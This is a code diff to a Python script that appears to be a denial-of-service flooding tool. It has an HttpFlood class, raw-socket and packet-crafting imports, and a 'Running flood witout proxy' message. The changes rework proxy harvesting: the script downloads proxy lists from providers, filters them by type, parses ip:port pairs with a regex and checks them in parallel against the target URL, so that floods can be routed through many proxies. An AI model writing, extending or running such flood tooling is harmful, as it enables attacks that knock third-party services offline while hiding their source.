@@ -1,18 +1,18 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-from json import load
 import os.path
-from re import compile
-from string import ascii_letters
 from _socket import gethostname
 from contextlib import suppress
 from itertools import cycle
+from json import load
 from math import trunc, log2
 from multiprocessing import Pool, cpu_count
-from random import randint, choice as randchoice, sample, randbytes
+from random import randint, choice as randchoice, randbytes
+from re import compile
 from socket import (IP_HDRINCL, IPPROTO_IP, inet_ntoa, IPPROTO_TCP, TCP_NODELAY, SOCK_STREAM, AF_INET, SOL_TCP, socket,
                     SOCK_DGRAM, SOCK_RAW)
 from ssl import SSLContext, create_default_context, CERT_NONE
+from string import ascii_letters
 from struct import pack as data_pack
 from sys import argv, exit
 from threading import Thread, Event
@@ -24,7 +24,7 @@ from cloudscraper import create_scraper
 from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import process_iter, net_io_counters, virtual_memory, cpu_percent
-from requests import get, Session
+from requests import get, Session, exceptions
 from socks import socksocket, HTTP, SOCKS5, SOCKS4
 from yarl import URL
 
@@ -534,29 +534,28 @@ class HttpFlood(Thread):
 
 class Regex:
     IP = compile(r"(?:\d{1,3}\.){3}\d{1,3}")
+    IPPort = compile(r"((?:\d{1,3}\.){3}\d{1,3})[:](\d+)")
 
 
 class ProxyManager:
     @staticmethod
-    def DownloadFromConfig(cf) -> Set[Proxy]:
+    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
         proxes: Set[Proxy] = set()
         for provider in cf["proxy-providers"]:
-            print(provider["url"])
-            with suppress(TimeoutError):
+            if Proxy_type != provider["type"]: continue
+
+            print(provider)
+            with suppress(TimeoutError, exceptions.ConnectionError, exceptions.ReadTimeout):
                 data = get(provider["url"], timeout=provider["timeout"]).text
-                for proy in data.split("\n"):
-                    if ":" in proxy:
-                        proxys = proy.strip().split(":")
-                        if Regex.IP.match(proxys[0]) and proxys[1].isnumeric():
-                            proxes.add(Proxy(proxys[0], int(proxys[1]), provider["type"]))
+                for proy in Regex.IPPort.findall(data):
+                    proxes.add(Proxy(proy[0], int(proy[1]), provider["type"]))
         return proxes
 
     @staticmethod
-    def checkAll(proxie: Set[Proxy], url: str = "http://google.com", timeout: int = 1) -> Set[Proxy]:
+    def checkAll(proxie: Set[Proxy], url: str = "http://google.com", timeout: int = 1, threads=100) -> Set[Proxy]:
         def checkProxy(poxy: Proxy) -> Tuple[bool, Proxy]:
             return poxy.Check(timeout=timeout, url=url), poxy
-
-        return {pro[1] for pro in Pool(len(proxies) // cpu_count()).map(checkProxy, proxie) if pro[0]}
+        return {pro[1] for pro in Pool(min(len(proxie) // cpu_count(), threads)).map(checkProxy, proxie) if pro[0]}
 
 
 class ToolsConsole:
@@ -772,7 +771,7 @@ class ToolsConsole:
     # noinspection PyUnreachableCode
     @staticmethod
     def info(domain):
-        with suppress(TimeoutError), get("https://ipwhois.app/json/%s/" % domain) as s:
+        with suppress(Exception), get("https://ipwhois.app/json/%s/" % domain) as s:
             return s.json()
         return {"success": False}
 
@@ -815,18 +814,16 @@ if __name__ == '__main__':
                 if not os.path.exists(proxy_li):
                     if rpc > 100: print("WARNING! The file doesn't exist, creating files and downloading proxies.")
                     with open(proxy_li, "a+") as wr:
-                        Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con)
-                        Proxies = ProxyManager.checkAll(Proxies)
+                        Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
+                        Proxies = ProxyManager.checkAll(Proxies, url.human_repr(), threads)
 
                         for proxy in Proxies:
                             wr.write(proxy.__str__() + "\n")
 
                 with open(proxy_li, "r+") as rr:
-                    for pro in rr.readlines():
-                        pro = pro.strip().split(":")
-                        if ":" in proxy:
-                            if Regex.IP.match(pro[0]) and pro[1].isnumeric():
-                                proxies.add(Proxy(pro[0], int(pro[1]), proxy_ty))
+                    for pro in Regex.IPPort.findall(rr.read()):
+                            proxies.add(Proxy(pro[0], int(pro[1]), proxy_ty))
+
                 if not proxies:
                     print("Empty Proxy File, Running flood witout proxy")
                     proxies = None
